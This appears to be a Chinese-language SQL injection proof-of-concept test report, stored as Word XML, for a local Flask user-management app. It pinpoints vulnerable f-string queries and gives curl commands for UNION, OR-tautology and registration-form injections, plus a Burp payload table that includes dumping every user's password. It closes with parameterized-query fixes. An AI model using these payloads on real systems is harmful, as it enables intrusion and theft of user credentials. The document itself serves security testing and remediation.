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SQL注入 POC测试报告</w:t>
        <w:br/>
        <w:t>Flask用户管理系统</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>检测日期：2026年07月08日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一、测试概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>二、应用功能介绍</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>三、漏洞原理分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>四、POC 1：UNION 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>五、POC 2：OR 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>六、POC 3：注册功能注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>七、Burp Suite 测试方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>八、POC 代码详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>九、修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、测试概述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应用名称</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户信息管理平台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Python Flask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(data/users.db)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SQL注入（f-string拼接）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curl, Burp Suite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>测试环境</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>http://127.0.0.1:5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:t>应用包含登录、注册、搜索三大功能，其中注册和搜索使用 f-string 拼接 SQL，存在 SQL 注入漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>二、应用功能介绍</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>登录功能</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户在 /login 输入用户名和密码登录，后台使用 USERS 字典验证。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>注册功能</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户在 /register 填写用户名、密码、邮箱、手机号注册，数据通过 f-string 拼接插入 SQLite。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>搜索功能</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户输入关键词，后台使用 f-string 拼接 SQL 查询用户数据，结果以表格展示。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、漏洞原理分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞代码定位</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>搜索功能（app.py）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注册功能（app.py）：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>开发者直接将用户输入拼接进 SQL 语句，未做任何过滤或参数化处理。攻击者可以构造特殊输入改变 SQL 语义。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、POC 1：UNION 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>测试步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>步骤1：登录获取 Session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>curl http://127.0.0.1:5000/login -d "username=admin&amp;password=admin123" -c /tmp/cookies.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>步骤2：执行 UNION 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj_pass%27,%27inj@x.com%27,%27138%27--%20" -b /tmp/cookies.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>预期结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>搜索结果中出现 "inj" 用户名，该用户非数据库真实用户，而是 UNION SELECT 注入的虚假数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>UNION 合并两个 SELECT 结果集。注入后生成 SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'-- %'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>列数必须匹配：users 表有 5 列，UNION SELECT 也必须提供 5 个值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、POC 2：OR 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>测试命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>curl 'http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271' -b /tmp/cookies.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>预期结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>返回数据库中所有用户（admin、alice 等），而非仅匹配关键词的用户。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OR 注入让 WHERE 条件永远为真：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>'1'='1' 永真，所有行都被返回。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、POC 3：注册功能注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>测试命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
        </w:rPr>
        <w:t>curl http://127.0.0.1:5000/register -d "username=hacker', 'pass', 'h@x.com', '123')--" -d "password=irrelevant"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>预期结果</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>注册成功，页面提示"注册成功，请登录"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>用户名中的 )-- 提前闭合 VALUES，注释掉后续内容：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>INSERT INTO users (...) VALUES ('hacker', 'pass', 'h@x.com', '123')--', 'irrelevant', '', '')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>七、Burp Suite 测试方法</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤1：登录后拦截 GET /search?keyword=admin 请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤2：发送到 Repeater（Ctrl+R）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤3：修改 keyword 参数测试以下 Payload：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原理</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>admin' OR '1'='1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回所有用户</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>OR 永真条件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>' UNION SELECT 1,2,3,4,5--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回数字</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>UNION 追加查询</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>' UNION SELECT 1,username,email,phone,password FROM users--</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>返回所有用户信息</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>读取真实数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、POC 代码详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POC 1：UNION 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>原始SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>输入 keyword = ' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'--</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>生成SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'-- %' OR email LIKE '%' UNION SELECT 1,'inj','inj_pass','inj@x.com','138'-- %'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>列数必须为 5：id, username, password, email, phone</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>-- 后必须加空格，SQLite 才识别为注释</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>POC 2：OR 万能条件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>输入 keyword = ' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>生成SQL：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>'1'='1' 永真，返回全部数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>九、修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>使用参数化查询</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 修复搜索</w:t>
        <w:br/>
        <w:t>c.execute('SELECT * FROM users WHERE username LIKE ? OR email LIKE ?',</w:t>
        <w:br/>
        <w:t xml:space="preserve">          (f'%{keyword}%', f'%{keyword}%'))</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复注册</w:t>
        <w:br/>
        <w:t>c.execute('INSERT INTO users VALUES (?,?,?,?,?)',</w:t>
        <w:br/>
        <w:t xml:space="preserve">          (None, username, password, email, phone))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>其他措施</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>输入验证：只允许合法字符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>最小权限：数据库账户分层管理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WAF 防护：部署 Web 应用防火墙</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>定期审计：代码审查 + 安全扫描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